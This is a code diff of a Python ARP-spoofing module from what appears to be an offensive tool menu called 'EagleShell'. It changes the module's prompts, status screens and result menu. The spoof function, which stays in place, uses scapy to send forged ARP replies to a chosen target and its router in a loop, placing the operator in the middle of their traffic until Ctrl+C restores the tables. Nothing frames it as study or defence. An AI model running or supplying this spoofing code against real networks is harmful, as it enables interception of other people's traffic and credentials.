@@ -3,6 +3,8 @@
 from assets.banners import arpspoof_banner
 from assets.designs import *
 from assets.properties import clear_screen
+from threading import Timer
+from subprocess import Popen, PIPE
 import scapy.all as scapy
 import time
 import sys
@@ -25,10 +27,16 @@ def arpspoof_main():
             print(author)
             print('Configuration:')
             print('')
+            print('\tRHOST = Target IP')
+            print('\tExample: 192.168.1.133')
+            print('')
+            print('\tGATEWAY = Router IP')
+            print('\tExample: 192.168.1.2')
+            print('')
             while True:
                 rhost_set = input('\u001b[33mRHOST \u001b[37m> ').lower()
                 gateway_set = input('\u001b[33mGATEWAY \u001b[37m> ').lower()
-                functions()
+                process()
         except KeyboardInterrupt:
             exit_shell()
 
@@ -41,9 +49,14 @@ def arpspoof_main():
         return(answered_list[0][1].hwsrc)
 
     def spoof(target_ip, spoof_ip):
-        target_mac = get_mac(target_ip)
-        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-        scapy.send(packet, verbose=False)
+        try:
+            target_mac = get_mac(target_ip)
+            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+            scapy.send(packet, verbose=False)
+        except IndexError:
+            print('\u001b[31m[-] Invalid Input.')
+            os.system('sleep 1')
+            arpspoof_main()
 
     def restore(destination_ip, source_ip):
         destination_mac = get_mac(destination_ip)
@@ -51,20 +64,71 @@ def arpspoof_main():
         packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
         scapy.send(packet, count=4, verbose=False)
 
-    def functions():
+    def reset_tables():
+        restore(rhost_set, gateway_set)
+        restore(gateway_set, rhost_set)
+
+    def process():
+        global sent_packets_count
         try:
             sent_packets_count = 0
             while True:
                 spoof(rhost_set, gateway_set)
                 spoof(gateway_set, rhost_set)
                 sent_packets_count = sent_packets_count + 2
-                print("\r[+] Packets sent: " + str(sent_packets_count)),
                 sys.stdout.flush()
                 time.sleep(2)
+                os.system(clear_screen)
+                print(logo)
+                print('')
+                print(line)
+                print(arpspoof_banner)
+                print(line)
+                print('')
+                print(author)
+                print('Process:')
+                print('')
+                print('\tStatus')
+                print('\t------')
+                print('\tPACKETS SENT: ' + str(sent_packets_count))
+                print('')
+                print('\tStop: CTRL+C')
+                print('')
         except KeyboardInterrupt:
-            print("\n\u001b[32;1m[+] Resetting ARP Tables...")
-            restore(rhost_set, gateway_set)
-            restore(gateway_set, rhost_set)
+            print('\n\u001b[32;1m[+] Resetting ARP Tables')
+            reset_tables()
+            result()
+
+    def result():
+        try:
+            os.system(clear_screen)
+            print(logo)
+            print('')
+            print(line)
+            print(arpspoof_banner)
+            print(line)
+            print('')
+            print(author)
+            print('Result:')
+            print('')
+            print('\tRHOST: ' + rhost_set)
+            print('\tGATEWAY: ' + gateway_set)
+            print('')
+            print('\tPACKETS SENT: ' + str(sent_packets_count))
+            print('')
+            print('\t1): New')
+            print('\t2): Exit')
+            print('')
+            while True:
+                result_cmd = input('\u001b[33mEagleShell \u001b[37m> ').lower()
+                if result_cmd == '1':
+                    arpspoof_main()
+                elif result_cmd == '2':
+                    exit_shell()
+                else:
+                    print('\u001b[31m[-] Invalid Input.')
+                    continue
+        except KeyboardInterrupt:
             exit_shell()
 
     def exit_shell():
